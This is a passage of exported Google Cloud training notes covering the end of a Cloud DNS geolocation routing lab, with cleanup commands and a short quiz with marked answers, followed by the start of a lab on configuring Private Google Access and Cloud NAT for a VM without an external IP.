CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">for i in {1..10}; do echo $i; curl geo.example.com; sleep 6; done</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Analyze the output to see which server is responding to the request. Since there is no policy item for any of the Asia regions, Cloud DNS will direct the client to the nearest server.</span></p></li><li><p><span>Once you have run the test multiple times, exit the client VM in Asia by typing &quot;</span><code>exit</code><span>&quot; in the VM&#39;s command prompt.</span></p></li></ol><h4 id='task-9-delete-lab-resources'><span>Task 9. Delete lab resources</span></h4><p><span>Although all resources you used in this lab will be deleted when you finish, it is good practice to remove resources you no longer need to avoid unnecessary charges.</span></p><ul><li><p><span>The following </span><code>gcloud</code><span> commands will delete all the resources that were created in the lab. (Note that </span><code>SELECTED-ZONE</code><span> is the Asia zone that you wrote down earlier.)</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#delete VMS</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances delete -q us-client-vm --zone "ZONE"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances delete -q us-web-vm --zone "ZONE"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances delete -q europe-client-vm --zone "Zone 2"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances delete -q europe-web-vm --zone "Zone 2"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances delete -q asia-client-vm --zone SELECTED-ZONE</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#delete FW rules</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules delete -q allow-http-traffic</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules delete fw-default-iapproxy</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#delete record set</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud dns record-sets delete geo.example.com --type=A --zone=example</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#delete private zone</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud dns managed-zones delete example</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 473px;"></div><div class="CodeMirror-gutters" style="display: none; height: 473px;"></div></div></div></pre><p>&nbsp;</p><h4 id='congratulations'><span>Congratulations</span></h4><p><span>In this lab, you configured and used Cloud DNS routing policies with Geolocation routing policy. You also verified the configuration and behavior of the Cloud DNS routing policy by observing the HTTP response when accessing the web servers.</span></p><h3 id='quiz-4'><span>Quiz</span></h3><ol start='' ><li><p><span>To set up hybrid deployments for DNS resolution, which type of DNS policy should you use?</span></p></li></ol><ul><li><p><strong><span>Server policy</span></strong></p></li><li><p><span>Response policy</span></p></li><li><p><span>Traffic policy</span></p></li><li><p><span>Routing policy</span></p></li></ul><ol start='2' ><li><p><span>You must create a VM that has an IPv6 address. How do you do it?</span></p></li></ol><ul><li><p><span>Create a single-stack subnet, and create the VM with an IPv6 address.</span></p></li><li><p><span>Create a single-stack subnet with IPv6 enabled, and then create the VM with an IPv4 address.</span></p></li><li><p><strong><span>Create a dual-stack subnet, and create the VM with an IPv6 address.</span></strong></p></li><li><p><span>Create a single-stack network, and create the VM with an IPv6 address.</span></p></li></ul><h2 id='private-connection-options'><span>Private Connection Options</span></h2><h3 id='lab---implement-private-google-access-and-cloud-nat'><span>LAB - Implement Private Google Access and Cloud NAT</span></h3><p><span>Overview</span></p><p><span>In this lab, you implement Private Google Access and Cloud NAT for a VM instance that doesn&#39;t have an external IP address. Then, you verify access to public IP addresses of Google APIs and services and other connections to the internet.</span></p><p><span>VM instances without external IP addresses are isolated from external networks. Using Cloud NAT, these instances can access the internet for updates and patches, and in some cases, for bootstrapping. As a managed service, Cloud NAT provides high availability without user management and intervention.</span></p><p><span>Objectives</span></p><p><span>In this lab, you learn how to perform the following tasks:</span></p><ul><li><p><span>Configure a VM instance that doesn&#39;t have an external IP address</span></p></li><li><p><span>Connect to a VM instance using an Identity-Aware Proxy (IAP) tunnel</span></p></li><li><p><span>Enable Private Google Access on a subnet</span></p></li><li><p><span>Configure a Cloud NAT gateway</span></p></li><li><p><span>Verify access to public IP addresses of Google APIs and services and other connections to the internet</span></p></li></ul><p>&nbsp;</p><p><span>For each lab, you get a new Google Cloud project and set of resources for a fixed time at no cost.</span></p><ol start='' ><li><p><span>Sign in to Qwiklabs using an </span><strong><span>incognito window</span></strong><span>.</span></p></li><li><p><span>Note the lab&#39;s access time (for example, </span><code>1:15:00</code><span>), and make sure you can finish within that time.</span>
<span>There is no pause feature. You can restart if needed, but you have to start at the beginning.</span></p></li><li><p><span>When ready, click </span><strong><span>Start lab</span></strong><span>.</span></p></li><li><p><span>Note your lab credentials (</span><strong><span>Username</span></strong><span> and </span><strong><span>Password</span></strong><span>). You will use them to sign in to the Google Cloud Console.</span></p></li><li><p><span>Click </span><strong><span>Open Google Console</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Use another account</span></strong><span> and copy/paste credentials for </span><strong><span>this</span></strong><span> lab into the prompts.</span>
<span>If you use other credentials, you&#39;ll receive errors or </span><strong><span>incur charges</span></strong><span>.</span></p></li><li><p><span>Accept the terms and skip the recovery resource page.</span></p><p><strong><span>Note:</span></strong><span> Do not click </span><strong><span>End Lab</span></strong><span> unless you have finished the lab or want to restart it. This clears your work and removes the project.</span></p></li></ol><h4 id='task-1-create-the-vm-instance'><span>Task 1. Create the VM instance</span></h4><p><span>Create a VPC network with some firewall rules and a VM instance that has no external IP address, and connect to the instance using an IAP tunnel.</span></p><p><span>Create a VPC network and firewall rules</span></p><p><span>First, create a VPC network for the VM instance and a firewall rule to allow SSH access.</span></p><ol start='' ><li><p><span>In the Cloud Console, on the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), click </span><strong><span>VPC network &gt; VPC networks</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create VPC Network</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Name</span></strong><span>, type </span><strong><span>privatenet</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Subnet creation mode</span></strong><span>, click </span><strong><span>Custom</span></strong><span>.</span></p></li><li><p><span>In </span><strong><span>New Subnet</span></strong><span> specify the following, and leave the remaining settings as their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>privatenet-us</span></td></tr><tr><td style='text-align:left;' ><span>Region</span></td><td style='text-align:left;' ><code>REGION</code></td></tr><tr><td style='text-align:left;' ><span>IPv4 address range</span></td><td style='text-align:left;' ><span>10.130.0.0/20</span></td></tr></tbody></table></figure><p><strong><span>Note:</span></strong><span> Don&#39;t enable </span><strong><span>Private Google access</span></strong><span> yet!</span></p><p>&nbsp;</p></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span> and wait for the network to be created.</span></p></li><li><p><span>In the left pane, click </span><strong><span>Firewall</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create Firewall Rule</span></strong><span>.</span></p></li><li><p><span>Specify the following, and leave the remaining settings as their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>privatenet-allow-ssh</span></td></tr><tr><td style='text-align:left;' ><span>Network</span></td><td style='text-align:left;' ><span>privatenet</span></td></tr><tr><td style='text-align:left;' ><span>Targets</span></td><td style='text-align:left;' ><span>All instances in the network</span></td></tr><tr><td style='text-align:left;' ><span>Source filter</span></td><td style='text-align:left;' ><span>IPv4 ranges</span></td></tr><tr><td style='text-align:left;' ><span>Source IPv4 ranges</span></td><td style='text-align:left;' ><span>35.235.240.0/20</span></td></tr><tr><td style='text-align:left;' ><span>Protocols and ports</span></td><td style='text-align:left;' ><span>Specified protocols and ports</span></td></tr></tbody></table></figure></li><li><p><span>For </span><strong><span>tcp</span></strong><span>, click the checkbox and specify port </span><strong><span>22</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p><p><span> </span><strong><span>Note:</span></strong><span> In order to connect to your private instance using SSH, you need to open an appropriate port on the firewall. </span><a href='https://cloud.google.com/iap/docs/using-tcp-forwarding'><span>IAP connections</span></a><span> come from a specific set of IP addresses (</span><strong><span>35.235.240.0/20</span></strong><span>). Therefore, you can limit the rule to this CIDR range.</span></p><p><span> Create the VM instance with no public IP address</span></p><p><span> </span></p></li><li><p><span>In the Cloud Console, on the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), click </span><strong><span>Compute Engine &gt; VM instances</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create Instance</span></strong><span>.</span></p></li><li><p><span>On the </span><strong><span>Machine configuration</span></strong><span> page, specify the following, and leave the remaining settings as their defaults:</span></p></li></ol><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>vm-internal</span></td></tr><tr><td style='text-align:left;' ><span>Region</span></td><td style='text-align:left;' ><code>REGION</code></td></tr><tr><td style='text-align:left;' ><span>Zone</span></td><td style='text-align:left;' ><code>ZONE</code></td></tr><tr><td style='text-align:left;' ><span>Series</span></td><td style='text-align:left;' ><span>E2</span></td></tr><tr><td style='text-align:left;' ><span>Machine type</span></td><td style='text-align:left;' ><span>e2-medium (2vCPU, 1 core, 4 GB memory)</span></td></tr></tbody></table></figure><ol start='4' ><li><p><span>Click </span><strong><span>OS and storage</span></strong><span>.</span></p></li><li><p><span>If the </span><strong><span>Image</span></strong><span> shown is not </span><strong><span>Debian GNU/Linux 12 (bookworm)</span></strong><span>, click </span><strong><span>Change</span></strong><span> and select </span><strong><span>Debian GNU/Linux 12 (bookworm)</span></strong><span>, and then click </span><strong><span>Select</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Networking</span></strong><span>.</span></p></li><li><p><span>In </span><strong><span>Network interfaces</span></strong><span>, edit the network interface by specifying the following:</span></p></li></ol><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Network</span></td><td style='text-align:left;' ><span>privatenet</span></td></tr><tr><td style='text-align:left;' ><span>Subnetwork</span></td><td style='text-align:left;' ><span>privatenet-us</span></td></tr><tr><td style='text-align:left;' ><span>External IPv4 address</span></td><td style='text-align:left;' ><span>None</span></td></tr></tbody></table></figure><p><strong><span>Note:</span></strong><span> The default setting for a VM instance is to have an ephemeral external IP address. This behavior can be changed with a policy constraint at the organization or project level. To learn more about controlling external IP addresses on VM instances, refer to the </span><a href='https://cloud.google.com/compute/docs/ip-addresses/reserve-static-external-ip-address#disableexternalip'><span>external IP address documentation</span></a><span>.</span></p><p>&nbsp;</p><ol start='8' ><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span>, and wait for the VM instance to be created.</span></p></li><li><p><span>On the </span><strong><span>VM instances</span></strong><span> page, verify that the </span><strong><span>External IP</span></strong><span> of </span><strong><span>vm-internal</span></strong><span> is </span><strong><span>None</span></strong><span>.</span></p></li></ol><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Create the VM instance</span></p><p>&nbsp;</p><p><span>SSH to vm-internal to test the IAP tunnel</span></p><ol start='' ><li><p><span>In the Cloud Console, click </span><strong><span>Activate Cloud Shell</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D" referrerpolicy="no-referrer" alt="Cloud Shell"><span>).</span></p></li><li><p><span>If prompted, click </span><strong><span>Continue</span></strong><span>.</span></p></li><li><p><span>To connect to </span><strong><span>vm-internal</span></strong><span>, run the following command:</span></p><p>&nbsp;</p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute ssh vm-internal --zone ZONE --tunnel-through-iap</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><ol start='4' ><li><p><span>If prompted click </span><strong><span>Authorize</span></strong></p></li><li><p><span>If prompted to continue, type </span><strong><span>Y</span></strong><span>.</span></p></li><li><p><span>When prompted for a passphrase, press </span><strong><span>ENTER</span></strong><span>.</span></p></li><li><p><span>When prompted for the same passphrase, press </span><strong><span>ENTER</span></strong><span>.</span></p></li></ol><p><span>Did the command prompt change to @vm-internal? </span></p><ul><li><p><span>True</span></p></li><li><p><span>False</span></p></li></ul><ol start='8' ><li><p><span>To test the external connectivity of </span><strong><span>vm-internal</span></strong><span>, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ping -c 2 www.google.com</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>This should not work because </span><strong><span>vm-internal</span></strong><span> has no external IP address!</span></p><ol start='9' ><li><p><span>Wait for the </span><code>ping</code><span> command to complete.</span></p></li><li><p><span>To return to your Cloud Shell instance, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> exit</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> When instances do not have external IP addresses, they can only be reached by other instances on the network via a managed VPN gateway or via a Cloud IAP tunnel. Cloud IAP enables context-aware access to VMs via SSH and RDP without bastion hosts. To learn more about this, see the blog post </span><a href='https://cloud.google.com/blog/products/identity-security/cloud-iap-enables-context-aware-access-to-vms-via-ssh-and-rdp-without-bastion-hosts'><span>Cloud IAP enables context-aware access to VMs via SSH and RDP without bastion hosts</span></a><span>.</span></p><h4 id='task-2-enable-private-google-access'><span>Task 2. Enable Private Google Access</span></h4><p><span>VM instances that have no external IP addresses can use Private Google Access to reach external IP addresses of Google APIs and services. By default, Private Google Access is disabled on a VPC network.</span></p><p><span>Create a Cloud Storage bucket</span></p><p><span>Create a Cloud Storage bucket to test access to Google APIs and services.</span></p><ol start='' ><li><p><span>In the Cloud Console, on the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), click </span><strong><span>Cloud Storage &gt; Buckets</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li><li><p><span>Specify the following, and leave the remaining settings as their defaults:</span></p></li></ol><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><em><span>Enter a globally unique name</span></em></td></tr><tr><td style='text-align:left;' ><span>Location type</span></td><td style='text-align:left;' ><span>Multi-region</span></td></tr></tbody></table></figure><ol start='4' ><li><p><span>Click </span><strong><span>Create</span></strong><span>. If prompted to enable public access prevention, ensure it is checked and cick </span><strong><span>Confirm</span></strong><span>. Note the name of your storage bucket.</span></p></li><li><p><span>Store the name of your bucket in an environment variable:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> export MY_BUCKET=[enter your bucket name here]</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><ol start='6' ><li><p><span>Verify it with echo:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> echo $MY_BUCKET</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copy an image file into your bucket</span></p><p><span>Copy an image from a public Cloud Storage bucket to your own bucket.</span></p><p>&nbsp;</p><ol start='' ><li><p><span>In Cloud Shell, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> gcloud storage cp gs://cloud-training/gcpnet/private/access.svg gs://$MY_BUCKET</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><ol start='2' ><li><p><span>In the Cloud Console, click your bucket name to verify that the image was copied.</span></p></li></ol><p><span>You can click on the name of the image in the Cloud Console to view an example of how Private Google Access is implemented.</span></p><p><span>Access the image from your VM instance</span></p><p><span>Currently, which of your VM instances can access the image from your bucket?</span></p><ul><li><p><span>vm-internal</span></p></li><li><p><span>Cloud Shell</span></p></li></ul><p>&nbsp;</p><ol start='' ><li><p><span>In Cloud Shell, to try to copy the image from your bucket, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 